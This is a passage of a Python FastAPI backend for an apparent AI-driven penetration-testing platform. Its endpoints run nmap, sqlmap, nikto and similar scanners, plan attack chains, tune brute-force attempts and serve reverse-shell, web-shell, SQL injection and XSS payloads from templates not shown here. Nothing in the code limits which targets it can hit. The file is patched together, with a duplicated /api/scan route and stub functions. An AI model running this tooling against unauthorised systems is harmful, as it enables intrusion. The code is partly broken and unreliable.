        actual_outcome=feedback.actual_outcome,
        feedback_text=feedback.feedback_text,
        tool_used=feedback.tool_used,
        meta_data=json.dumps({"success": feedback.success} if feedback.success is not None else {}),
        timestamp=datetime.utcnow()
    )
    db.add(feedback_record)
    db.commit()
    
    # Update intelligence engine with feedback
    if intelligence_engine and feedback.attack_id:
        # Get attack details
        attack = db.query(AttackHistory).filter(AttackHistory.id == feedback.attack_id).first()
        if attack:
            feedback_data = {
                "actual_outcome": "success" if attack.success else "failure",
                "tool_used": attack.tool_used,
                "success": attack.success
            }
            intelligence_engine.process_feedback(
                current_user.id,
                feedback.scan_id,
                feedback.attack_id,
                feedback_data
            )
    
    return {"status": "feedback received", "id": feedback_record.id}

@app.get("/api/ai/learning-stats")
async def get_learning_stats(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get AI learning statistics (admin only)"""
    if current_user.role != UserRole.ADMIN.value:
        raise HTTPException(status_code=403, detail="Admin only")
    
    if intelligence_engine:
        stats = intelligence_engine.learning_manager.get_learning_stats()
        
        # Add database stats
        total_feedback = db.query(UserFeedback).count()
        stats['total_feedback_db'] = total_feedback
        
        return stats
    else:
        return {"error": "Learning manager not available"}

@app.get("/api/ai/analysis/{analysis_id}")
async def get_analysis(
    analysis_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get a specific AI analysis by ID"""
    analysis = db.query(AIAnalysis).filter(
        AIAnalysis.analysis_id == analysis_id,
        AIAnalysis.user_id == current_user.id
    ).first()
    
    if not analysis:
        raise HTTPException(status_code=404, detail="Analysis not found")
    
    return {
        "analysis_id": analysis.analysis_id,
        "context": json.loads(analysis.context) if analysis.context else {},
        "strategies": json.loads(analysis.strategies) if analysis.strategies else [],
        "attack_graph": json.loads(analysis.attack_graph) if analysis.attack_graph else {},
        "risk_score": analysis.risk_score,
        "confidence": analysis.confidence,
        "mode": json.loads(analysis.mode) if analysis.mode else {},
        "meta_data": json.loads(analysis.meta_data) if analysis.meta_data else {},
        "timestamp": analysis.timestamp.isoformat()
    }

# ==================== EXISTING API ENDPOINTS ====================
@app.get("/api/users/me")
async def get_current_user_info(current_user: User = Depends(get_current_user)):
    """Get current user info"""
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "role": current_user.role,
        "score": current_user.score,
        "api_key": current_user.api_key
    }

@app.get("/api/tools")
async def get_tools(db: Session = Depends(get_db)):
    """Get all Kali tools"""
    tools = db.query(KaliTools).all()
    return tools
# Inside fast6.py -> perform_scan function
@app.post("/api/scan")
async def start_scan(target: str):
    # 1. Notify UI that scan started
    await sio.emit('agent_thought', {
        'layer': 'LAYER_1_CNN',
        'thought': f"Initiating neural sweep on {target}...",
        'type': 'info'
    })
    
    # 2. Trigger the Brain
    # result = brain.think(target)
    
    # 3. Stream thoughts to the results.html panel
    await sio.emit('agent_thought', {
        'layer': 'LAYER_4_BNN',
        'thought': "Probabilistic model suggests high vulnerability in port 80.",
        'type': 'warning'
    })
    return {"status": "processing"}
@app.post("/api/scan")
async def perform_scan(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Perform a security scan"""
    data = await request.json()
    target = data.get('target')
    scan_type = data.get('scan_type', 'nmap')
    options = data.get('options', {})
    
    if not target:
        raise HTTPException(status_code=400, detail="Target required")
    
    # Choose tool based on scan_type
    if scan_type == 'nmap':
        results = PenetrationTools.nmap_scan(target, options.get('args', '-sV'))
    elif scan_type == 'nikto':
        results = PenetrationTools.nikto_scan(target)
    elif scan_type == 'sqlmap':
        results = PenetrationTools.sqlmap_scan(target)
    elif scan_type == 'gobuster':
        results = PenetrationTools.gobuster_dir(target)
    elif scan_type == 'wpscan':
        results = PenetrationTools.wpscan(target)
    else:
        results = PenetrationTools.nmap_scan(target)
    
    # Save to history
    scan = ScanHistory(
        user_id=current_user.id,
        target=target,
        scan_type=scan_type,
        tool_used=scan_type,
        results=json.dumps(results),
        vulnerabilities=json.dumps(results.get('vulnerabilities', [])),
        status='completed',
        timestamp=datetime.utcnow()
    )
    db.add(scan)
    current_user.score = (current_user.score or 0) + 10
    db.commit()
    
    return results

@app.get("/api/scans")
async def get_scans(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
    page: int = 1,
    limit: int = 10
):
    """Get paginated scans"""
    scans = db.query(ScanHistory).filter(
        ScanHistory.user_id == current_user.id
    ).order_by(
        ScanHistory.timestamp.desc()
    ).offset((page-1) * limit).limit(limit).all()
    
    total = db.query(ScanHistory).filter(ScanHistory.user_id == current_user.id).count()
    
    return {
        "page": page,
        "limit": limit,
        "total": total,
        "scans": scans
    }

@app.get("/api/attacks")
async def get_attacks(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
    page: int = 1,
    limit: int = 10
):
    """Get paginated attacks"""
    attacks = db.query(AttackHistory).filter(
        AttackHistory.user_id == current_user.id
    ).order_by(
        AttackHistory.timestamp.desc()
    ).offset((page-1) * limit).limit(limit).all()
    
    total = db.query(AttackHistory).filter(AttackHistory.user_id == current_user.id).count()
    
    return {
        "page": page,
        "limit": limit,
        "total": total,
        "attacks": attacks
    }

# ==================== AI RAG ENDPOINTS ====================
@app.post("/api/ai/rag/search")
async def rag_search(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Search vulnerabilities using GPU-accelerated RAG"""
    data = await request.json()
    query = data.get('query', '')
    k = data.get('k', 5)
    use_ai = data.get('use_ai', True)  # Allow users to choose search method
    
    # Time the search
    import time
    start_time = time.time()
    
    results = rag_system.search(query, k, use_ai=use_ai) if rag_system else []
    
    elapsed = (time.time() - start_time) * 1000  # Convert to ms
    
    # Log AI interaction
    try:
        ai_log = AILog(
            user_id=current_user.id,
            interaction_type="rag_search",
            user_input=query,
            ai_response=json.dumps(results[:2]),
            model_used="gpu-accelerated" if use_ai and EMBEDDINGS_AVAILABLE else "keyword",
            latency_ms=int(elapsed),
            meta_data=json.dumps({"num_results": len(results), "use_ai": use_ai}),
            timestamp=datetime.utcnow()
        )
        db.add(ai_log)
        db.commit()
    except:
        pass
    
    return {
        "query": query,
        "results": results,
        "count": len(results),
        "search_type": "semantic" if results and results[0].get('search_type') == 'semantic' else "keyword",
        "latency_ms": int(elapsed),
        "gpu_accelerated": use_ai and EMBEDDINGS_AVAILABLE and CUDA_AVAILABLE
    }

@app.post("/api/ai/attack-chain")
async def generate_attack_chain(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Generate attack chain based on vulnerabilities"""
    data = await request.json()
    target = data.get('target')
    scan_id = data.get('scan_id')
    
    vulnerabilities = []
    
    if scan_id:
        scan = db.query(ScanHistory).filter(
            ScanHistory.id == scan_id,
            ScanHistory.user_id == current_user.id
        ).first()
        if scan and scan.vulnerabilities:
            try:
                vulnerabilities = json.loads(scan.vulnerabilities)
            except:
                vulnerabilities = []
    
    if not vulnerabilities and target and rag_system:
        rag_results = rag_system.search(target, k=3)
        vulnerabilities = rag_results
    
    chain = rag_system.generate_attack_chain(vulnerabilities, target or 'target') if rag_system else []
    
    return {
        "target": target,
        "attack_chain": chain,
        "vulnerabilities_found": len(vulnerabilities)
    }

@app.post("/api/ai/optimize")
async def optimize_attack(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Optimize attack parameters using Bayesian optimization"""
    data = await request.json()
    attack_type = data.get('attack_type', 'bruteforce')
    
    previous = db.query(AttackHistory).filter(
        AttackHistory.user_id == current_user.id,
        AttackHistory.attack_type == attack_type
    ).limit(10).all()
    
    attempts = [{"success": a.success, "parameters": {}} for a in previous]
    
    result = optimizer.optimize_attack(attack_type, attempts) if optimizer else {"error": "Optimizer not available"}
    
    return result

# ==================== WEBSOCKET ====================
@app.websocket("/ws/{user_id}")
async def websocket_endpoint(websocket: WebSocket, user_id: int):
    """WebSocket endpoint for real-time updates"""
    await manager.connect(websocket, user_id)
    try:
        while True:
            data = await websocket.receive_text()
            # Echo back for now
            await websocket.send_text(f"Echo: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket, user_id)

# ==================== KALI VM ENDPOINTS ====================
@app.get("/api/kali/status")
async def kali_status(current_user: User = Depends(get_current_user)):
    return {"status": kali_vm.check_vm_status()}

@app.post("/api/kali/start")
async def kali_start(current_user: User = Depends(get_current_user)):
    success = kali_vm.start_vm()
    return {"success": success, "status": kali_vm.check_vm_status()}

@app.post("/api/kali/stop")
async def kali_stop(current_user: User = Depends(get_current_user)):
    success = kali_vm.stop_vm()
    return {"success": success, "status": kali_vm.check_vm_status()}

# ==================== CRYPTOGRAPHY TOOLS ENDPOINTS ====================
@app.post("/api/hash")
async def generate_hash(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Generate hash from text using specified algorithm"""
    try:
        data = await request.json()
        text = data.get('text', '')
        algorithm = data.get('algorithm', 'md5').lower()
        
        if not text:
            return {"error": "No text provided"}
        
        text_bytes = text.encode('utf-8')
        
        if algorithm == 'md5':
            hash_result = hashlib.md5(text_bytes).hexdigest()
        elif algorithm == 'sha1':
            hash_result = hashlib.sha1(text_bytes).hexdigest()
        elif algorithm == 'sha256':
            hash_result = hashlib.sha256(text_bytes).hexdigest()
        elif algorithm == 'sha512':
            hash_result = hashlib.sha512(text_bytes).hexdigest()
        else:
            return {"error": f"Unsupported algorithm: {algorithm}"}
        
        return {"hash": hash_result, "algorithm": algorithm}
    
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/base64")
async def base64_process(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Base64 encode or decode text"""
    try:
        data = await request.json()
        text = data.get('text', '')
        action = data.get('action', 'encode').lower()
        
        if not text:
            return {"error": "No text provided"}
        
        if action == 'encode':
            text_bytes = text.encode('utf-8')
            result = base64.b64encode(text_bytes).decode('utf-8')
            return {"result": result, "action": "encoded"}
        
        elif action == 'decode':
            try:
                text += '=' * ((4 - len(text) % 4) % 4)
                text_bytes = base64.b64decode(text)
                result = text_bytes.decode('utf-8')
                return {"result": result, "action": "decoded"}
            except:
                return {"error": "Invalid base64 string"}
        
        else:
            return {"error": f"Unsupported action: {action}"}
    
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/crypto/caesar")
async def caesar_cipher_endpoint(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Caesar cipher encryption/decryption"""
    try:
        data = await request.json()
        text = data.get('text', '')
        shift = int(data.get('shift', 3))
        mode = data.get('mode', 'encrypt')
        
        result = CryptoTools.caesar_cipher(text, shift, mode)
        return {"result": result}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/crypto/rot13")
async def rot13_endpoint(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """ROT13 cipher"""
    try:
        data = await request.json()
        text = data.get('text', '')
        result = CryptoTools.rot13(text)
        return {"result": result}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/crypto/xor")
async def xor_cipher_endpoint(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """XOR cipher with key"""
    try:
        data = await request.json()
        text = data.get('text', '')
        key = data.get('key', 'secret')
        result = CryptoTools.xor_cipher(text, key)
        return {"result": result}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/crypto/binary")
async def binary_endpoint(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Binary encode/decode"""
    try:
        data = await request.json()
        text = data.get('text', '')
        mode = data.get('mode', 'encode')
        
        if mode == 'encode':
            result = CryptoTools.binary_encode(text)
        else:
            result = CryptoTools.binary_decode(text)
        
        return {"result": result, "mode": mode}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/crypto/hex")
async def hex_endpoint(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Hex encode/decode"""
    try:
        data = await request.json()
        text = data.get('text', '')
        mode = data.get('mode', 'encode')
        
        if mode == 'encode':
            result = CryptoTools.hex_encode(text)
        else:
            result = CryptoTools.hex_decode(text)
        
        return {"result": result, "mode": mode}
    except Exception as e:
        return {"error": str(e)}
# ==================== EMILY AI ENDPOINTS ====================

@app.post("/api/emily/analyze")
async def emily_analyze(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Emily AI - Analyze target and generate exploit plan"""
    data = await request.json()
    target = data.get('target')
    scan_id = data.get('scan_id')
    
    if not target and not scan_id:
        raise HTTPException(status_code=400, detail="Target or scan_id required")
    
    # Get target information
    target_info = {"target": target, "lhost": data.get('lhost', '127.0.0.1'), "lport": data.get('lport', '4444')}
    vulnerabilities = []
    
    if scan_id:
        scan = db.query(ScanHistory).filter(
            ScanHistory.id == scan_id,
            ScanHistory.user_id == current_user.id
        ).first()
        if scan and scan.vulnerabilities:
            try:
                vulnerabilities = json.loads(scan.vulnerabilities)
            except:
                vulnerabilities = []
    
    # If no vulnerabilities from scan, try to get from target
    if not vulnerabilities and target:
        # Search for similar vulnerabilities in RAG system
        if rag_system and rag_system.initialized:
            rag_results = rag_system.search(target, k=5)
            for result in rag_results:
                vuln = result.get('vulnerability', {})
                vulnerabilities.append({
                    'name': vuln.get('name', 'Unknown'),
                    'severity': vuln.get('severity', 'MEDIUM'),
                    'cve': vuln.get('cve_id'),
                    'description': vuln.get('description', ''),
                    'probability': result.get('similarity_score', 0.7) * 100
                })
    
    # Use Emily AI to analyze
    if emily_ai:
        analysis = emily_ai.analyze_target(target_info, vulnerabilities)
        
        # Store analysis in database
        ai_analysis = AIAnalysis(
            analysis_id=str(uuid.uuid4()),
            user_id=current_user.id,
            scan_id=scan_id,
            context=json.dumps(target_info),
            strategies=json.dumps(analysis['attack_vectors']),
            attack_graph=json.dumps(analysis['exploit_chain']),
            risk_score=analysis['summary']['risk_score'],
            confidence=analysis['confidence'],
            mode=json.dumps({"mode": "emily_ai", "version": emily_ai.version}),
            meta_data=json.dumps({
                "payloads": analysis['payloads'],
                "recommendations": analysis['recommendations']
            }),
            timestamp=datetime.utcnow()
        )
        db.add(ai_analysis)
        db.commit()
        
        return analysis
    else:
        raise HTTPException(status_code=503, detail="Emily AI not initialized")


@app.post("/api/emily/generate-payload")
async def emily_generate_payload(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Emily AI - Generate specific payload for vulnerability"""
    data = await request.json()
    vuln_type = data.get('vuln_type', 'rce')
    target = data.get('target', 'TARGET')
    lhost = data.get('lhost', '127.0.0.1')
    lport = data.get('lport', '4444')
    
    if not emily_ai:
        raise HTTPException(status_code=503, detail="Emily AI not initialized")
    
    # Create a dummy vulnerability for payload generation
    vuln = {
        'name': vuln_type,
        'severity': 'HIGH',
        'service': data.get('service', 'http')
    }
    
    target_info = {
        'target': target,
        'lhost': lhost,
        'lport': lport
    }
    
    payload = emily_ai._generate_payload(vuln, None, target_info)
    
    # Generate multiple variants if requested
    variants = []
    if data.get('variants', False):
        if 'sql' in vuln_type.lower():
            variants = list(emily_ai.payload_templates['sql_injection'].values())
        elif 'xss' in vuln_type.lower():
            variants = list(emily_ai.payload_templates['xss_payloads'].values())
        elif 'lfi' in vuln_type.lower():
            variants = list(emily_ai.payload_templates['lfi_payloads'].values())
        elif 'command' in vuln_type.lower() or 'rce' in vuln_type.lower():
            variants = list(emily_ai.payload_templates['command_injection'].values())
        elif 'shell' in vuln_type.lower():
            variants = [template.format(lhost=lhost, lport=lport) for template in emily_ai.payload_templates['reverse_shell'].values()]
    
    return {
        "vulnerability": vuln_type,
        "payload": payload,
        "variants": variants[:5] if variants else []
    }


@app.post("/api/emily/generate-report")
async def emily_generate_report(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Emily AI - Generate comprehensive report from analysis ID"""
    data = await request.json()
    analysis_id = data.get('analysis_id')
    format = data.get('format', 'html')
    
    if not analysis_id:
        raise HTTPException(status_code=400, detail="analysis_id required")
    
    # Get analysis from database
    analysis_record = db.query(AIAnalysis).filter(
        AIAnalysis.analysis_id == analysis_id,
        AIAnalysis.user_id == current_user.id
    ).first()
    
    if not analysis_record:
        raise HTTPException(status_code=404, detail="Analysis not found")
    
    if not emily_ai:
        raise HTTPException(status_code=503, detail="Emily AI not initialized")
    
    # Reconstruct analysis object
    analysis = {
        "target": json.loads(analysis_record.context).get("target") if analysis_record.context else "unknown",
        "timestamp": analysis_record.timestamp.isoformat(),
        "summary": {
            "total_vulnerabilities": 0,
            "critical_count": 0,
            "high_count": 0,
            "medium_count": 0,
            "low_count": 0,
            "attack_vectors_count": len(json.loads(analysis_record.strategies)) if analysis_record.strategies else 0,
            "payloads_generated": len(json.loads(analysis_record.meta_data).get("payloads", [])) if analysis_record.meta_data else 0,
            "risk_score": analysis_record.risk_score or 50,
            "risk_level": "MEDIUM"
        },
        "attack_vectors": json.loads(analysis_record.strategies) if analysis_record.strategies else [],
        "exploit_chain": json.loads(analysis_record.attack_graph) if analysis_record.attack_graph else [],
        "payloads": json.loads(analysis_record.meta_data).get("payloads", []) if analysis_record.meta_data else [],
        "recommendations": json.loads(analysis_record.meta_data).get("recommendations", []) if analysis_record.meta_data else [],
        "risk_level": analysis_record.mode or "MEDIUM",
        "confidence": analysis_record.confidence or 0.75
    }
    
    # Calculate counts from exploit chain
    for exploit in analysis["exploit_chain"]:
        severity = exploit.get("severity", "MEDIUM")
        if severity == "CRITICAL":
            analysis["summary"]["critical_count"] += 1
        elif severity == "HIGH":
            analysis["summary"]["high_count"] += 1
        elif severity == "MEDIUM":
            analysis["summary"]["medium_count"] += 1
        else:
            analysis["summary"]["low_count"] += 1
        analysis["summary"]["total_vulnerabilities"] += 1
    
    # Generate report
    if format == "html":
        report = emily_ai.generate_report(analysis, "html")
        return HTMLResponse(content=report)
    elif format == "markdown":
        report = emily_ai.generate_report(analysis, "markdown")
        return Response(content=report, media_type="text/markdown")
    elif format == "json":
        return analysis
    else:
        report = emily_ai.generate_report(analysis, "text")
        return Response(content=report, media_type="text/plain")


@app.get("/api/emily/status")
async def emily_status(current_user: User = Depends(get_current_user)):
    """Get Emily AI status and capabilities"""
    if not emily_ai:
        return {"status": "not_initialized"}
    
    return {
        "name": emily_ai.name,
        "version": emily_ai.version,
        "capabilities": {
            "exploit_analysis": True,
            "payload_generation": True,
            "attack_planning": True,
            "report_generation": True,
            "formats": ["html", "markdown", "json", "text"]
        },
        "exploit_database": len(emily_ai.exploit_database),
        "payload_templates": {
            "reverse_shell": len(emily_ai.payload_templates["reverse_shell"]),
            "web_shell": len(emily_ai.payload_templates["web_shell"]),
            "sql_injection": len(emily_ai.payload_templates["sql_injection"]),
            "xss": len(emily_ai.payload_templates["xss_payloads"]),
            "lfi": len(emily_ai.payload_templates["lfi_payloads"]),
            "command_injection": len(emily_ai.payload_templates["command_injection"])
        },
        "attack_patterns": {
            "web": len(emily_ai.attack_patterns["web"]),
            "network": len(emily_ai.attack_patterns["network"]),
            "wireless": len(emily_ai.attack_patterns["wireless"]),
            "password": len(emily_ai.attack_patterns["password"])
        }
    }
# ==================== EXPORT DATA ENDPOINT ====================
@app.get("/api/export/burp-data")
async def get_burp_export_data(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get export data for Burp Suite testing page"""
    generator = ExportDataGenerator()
    export_data = generator.generate_export_data(db, current_user.id)
    return export_data

# ==================== CORRELATION ENGINE ENDPOINTS (if available) ====================
if CORRELATION_AVAILABLE and correlation_system:
    @app.get("/api/correlation/status")
    async def correlation_status():
        """Get correlation system status"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
        
        return {
            "event_bus": correlation_system['event_bus'].get_stats(),
            "attack_graph": correlation_system['attack_graph'].to_dict(),
            "risk_score": {
                "overall": correlation_system['risk_engine'].overall_score,
                "level": correlation_system['risk_engine'].get_risk_level(),
                "assets": correlation_system['risk_engine'].asset_scores
            },
            "learning": correlation_system['intelligence_memory'].get_learning_stats()
        }

    @app.get("/api/correlation/attack-graph")
    async def get_attack_graph(asset: str = None):
        """Get attack graph"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        if asset:
            paths = correlation_system['attack_graph'].get_attack_paths(asset)
            return {"asset": asset, "paths": paths}
        return correlation_system['attack_graph'].to_dict()

    @app.get("/api/correlation/risk")
    async def get_risk_status():
        """Get risk status"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        return {
            "overall_score": correlation_system['risk_engine'].overall_score,
            "level": correlation_system['risk_engine'].get_risk_level(),
            "top_risks": correlation_system['risk_engine'].get_top_risks(5),
            "trend": correlation_system['risk_engine'].get_risk_trend()
        }

    @app.get("/api/correlation/events")
    async def get_events(limit: int = 100, event_type: str = None):
        """Get recent events from memory"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        events = correlation_system['correlation_engine'].memory[-limit:]
        if event_type:
            events = [e for e in events if e.event_type.value == event_type]
        return {"events": [e.to_dict() for e in events]}

    @app.post("/api/correlation/analyze")
    async def analyze_patterns(events: List[Dict] = None):
        """Analyze patterns and get recommendations"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        if events:
            # Convert dicts to SecurityEvent objects
            security_events = [EngineSecurityEvent.from_dict(e) for e in events]
        else:
            security_events = correlation_system['correlation_engine'].memory
        
        decision = correlation_system['decision_engine'].analyze(
            security_events, 
            correlation_system['attack_graph']
        )
        
        return decision

    @app.post("/api/correlation/learn")
    async def store_attack_pattern(path: List[str], success: bool = True, context: Dict = None):
        """Store attack pattern for learning"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        correlation_system['intelligence_memory'].store_pattern(path, success, context)
        return {"status": "stored", "pattern": "->".join(path)}

    @app.get("/api/correlation/predict")
    async def predict_next_attack():
        """Predict next likely attack"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        events = correlation_system['correlation_engine'].memory
        prediction = correlation_system['decision_engine'].predict_next_attack(events)
        return prediction

    @app.get("/api/correlation/success-patterns")
    async def get_success_patterns(limit: int = 10):
        """Get most successful attack patterns"""
        if not correlation_system:
            raise HTTPException(status_code=503, detail="Correlation system not initialized")
            
        return {
            "patterns": correlation_system['intelligence_memory'].get_most_successful_paths(limit)
        }







# ==================== SENTINEL-1 BRAIN INTEGRATION ====================
try:
    from sentinel_brain import SentinelBrain, integrate_with_fastapi
    
    # Initialize Sentinel Brain (will use GPU if available)
    sentinel_brain = SentinelBrain()
    
    # Integrate with FastAPI
    app = integrate_with_fastapi(app, sentinel_brain)
    
    # Store in app state
    app.state.sentinel_brain = sentinel_brain
    
    print("\n✓ SENTINEL-1 v6.5 Brain fully integrated!")
    
except ImportError as e:
    print(f"⚠ Sentinel Brain not available: {e}")
    sentinel_brain = None




# Add with other imports near the top

from sentinel_utils import SafetyCage, fetch_internet_intel

# Add to fast5.py - after initializing all components

# Initialize Orchestrator
try:
    from orchestrator import SentinelOrchestrator
    
    orchestrator = SentinelOrchestrator().initialize(
        correlation_system=correlation_system,
        intelligence_engine=intelligence_engine,
        sentinel_brain=sentinel_brain,
        emily_ai=emily_ai,
        rag_system=rag_system
    )
    
    app.state.orchestrator = orchestrator
    print("\n" + "=" * 60)
    print(" ✓ SENTINEL ORCHESTRATOR ONLINE".center(60))
    print("=" * 60)
    
except ImportError as e:
    print(f"⚠ Orchestrator not available: {e}")
    orchestrator = None

# Add unified pipeline endpoint
@app.post("/api/pipeline/analyze")
async def run_pipeline(
    request: Request,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Run complete intelligence pipeline through all layers"""
    data = await request.json()
    target = data.get('target')
    scan_result = data.get('scan_result', {})
    
    if not target:
        raise HTTPException(status_code=400, detail="Target required")
    
    if not orchestrator:
        raise HTTPException(status_code=503, detail="Orchestrator not initialized")
    
    # Run pipeline
    result = orchestrator.run_unified_pipeline(
        scan_result=scan_result,
        target=target,
        user_id=current_user.id,
        db_session=db
    )
    
    # Store in database
    try:
        pipeline_record = UnifiedAnalysis(
            pipeline_id=result['pipeline_id'],
            user_id=current_user.id,
            target=target,
            result=json.dumps(result),
            risk_score=result['final']['risk_score'],
            confidence=result['final']['confidence'],
            timestamp=datetime.utcnow()
        )
        db.add(pipeline_record)
        db.commit()
    except Exception as e:
        logger.error(f"Failed to store pipeline result: {e}")
        db.rollback()
    
    return result

@app.get("/api/pipeline/status")
async def get_pipeline_status():
    """Get pipeline status and stats"""
    if not orchestrator:
        return {"status": "not_initialized"}
    
    return {
        "status": "ready",
        "stats": orchestrator.get_pipeline_stats()
    }

@app.get("/api/pipeline/history")
async def get_pipeline_history(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
    limit: int = 10
):
    """Get recent pipeline analyses"""
    try:
        analyses = db.query(UnifiedAnalysis).filter(
            UnifiedAnalysis.user_id == current_user.id
        ).order_by(UnifiedAnalysis.timestamp.desc()).limit(limit).all()
        
        return {
            "analyses": [
                {
                    "pipeline_id": a.pipeline_id,
                    "target": a.target,
                    "risk_score": a.risk_score,
                    "confidence": a.confidence,
                    "timestamp": a.timestamp.isoformat()
                }
                for a in analyses
            ]
        }
    except Exception as e:
        return {"error": str(e), "analyses": []}

# Around line 850 in fast5.py (Analyze Endpoint)
@app.post("/api/analyze")
async def analyze_vulnerabilities(data: Dict[str, Any]):
    target = data.get('target')
    # ... existing logic ...

    # FIX: Push findings to Correlation System
    if correlation_system and 'vulnerabilities' in data:
        for vuln in data['vulnerabilities']:
            event = {
                "type": "VULNERABILITY_SCAN",
                "severity": vuln.get('severity', 'MEDIUM'),
                "details": f"Found {vuln.get('name')} on {target}",
                "metadata": {"cve": vuln.get('cve_id'), "port": vuln.get('port')}
            }
            # This triggers the graph update the HTML is looking for
            correlation_system['correlation_engine'].process_event(event)

    # ... rest of function ...


# Add to fast5.py database models section

class UnifiedAnalysis(Base):
    __tablename__ = "unified_analyses"
    
    id = Column(Integer, primary_key=True, index=True)
    pipeline_id = Column(String(36), unique=True, index=True, nullable=False)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    target = Column(String(200), nullable=False)
    result = Column(Text, nullable=True)  # JSON with full pipeline results
    risk_score = Column(Float, nullable=True)
    confidence = Column(Float, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    user = relationship("User")












# Add to fast5.py - after other route definitions

@app.get("/pipeline", response_class=HTMLResponse, include_in_schema=False)
async def pipeline_dashboard(request: Request, db: Session = Depends(get_db)):
    """Pipeline dashboard page"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login", status_code=303)
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login", status_code=303)
            
    except Exception as e:
        print(f"Auth error in pipeline page: {e}")
        return RedirectResponse(url="/login", status_code=303)
    
    return templates.TemplateResponse("pipeline.html", {
        "request": request,
        "user": user,
        "gpu_available": CUDA_AVAILABLE
    })

@app.get("/api/pipeline/analysis/{pipeline_id}")
async def get_pipeline_analysis(
    pipeline_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get specific pipeline analysis by ID"""
    try:
        analysis = db.query(UnifiedAnalysis).filter(
            UnifiedAnalysis.pipeline_id == pipeline_id,
            UnifiedAnalysis.user_id == current_user.id
        ).first()
        
        if not analysis:
            raise HTTPException(status_code=404, detail="Analysis not found")
        
        return json.loads(analysis.result)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))






# Add to fast5.py

from math_education import MathConceptExplainer, MathProblemGenerator, MathVisualization

# Initialize math modules
math_explainer = MathConceptExplainer()
math_problem_generator = MathProblemGenerator()
math_visualization = MathVisualization()

# Add math education endpoints
@app.get("/math/explain/{concept}")
async def explain_math_concept(
    concept: str,
    subtopic: str = None,
    current_user: User = Depends(get_current_user)
):
    """Get explanation of mathematical concept with security context"""
    
    if subtopic:
        # Get specific subtopic explanation
        if concept in math_explainer.concepts and subtopic in math_explainer.concepts[concept]:
            explanation = math_explainer.concepts[concept][subtopic]({})
            return explanation
    else:
        # Get overview of concept
        if concept in math_explainer.concepts:
            return {
                'concept': concept,
                'subtopics': list(math_explainer.concepts[concept].keys()),
                'description': f"Explore {concept} concepts in cybersecurity context"
            }
    
    raise HTTPException(status_code=404, detail="Concept not found")
@app.get("/matrix")
async def matrix_dashboard():
    return {
        "matrix": "Sentinel Threat Matrix",
        "status": "active"
    }

@app.get("/math/problems/{topic}")
async def get_math_problems(
    topic: str,
    difficulty: str = 'medium',
    count: int = 3,
    current_user: User = Depends(get_current_user)
):
    """Get mathematical problems with security context"""
    
    if topic in math_problem_generator.problems:
        problems = math_problem_generator.problems[topic](difficulty)
        return {
            'topic': topic,
            'difficulty': difficulty,
            'problems': problems[:count]
        }
    
    raise HTTPException(status_code=404, detail="Topic not found")

@app.post("/math/visualize/vectors")
async def visualize_vectors(
    request: Request,
    current_user: User = Depends(get_current_user)
):
    """Create vector visualization"""
    data = await request.json()
    vectors = [np.array(v) for v in data.get('vectors', [])]
    title = data.get('title', 'Vector Visualization')
    
    fig = math_visualization.plot_vector_space(vectors, title)
    
    # Convert plot to base64 for web display
    import io
    import base64
    
    buf = io.BytesIO()
    fig.savefig(buf, format='png', bbox_inches='tight')
    buf.seek(0)
    img_str = base64.b64encode(buf.read()).decode('utf-8')
    plt.close(fig)
    
    return {
        'image': f"data:image/png;base64,{img_str}",
        'vectors': [v.tolist() for v in vectors]
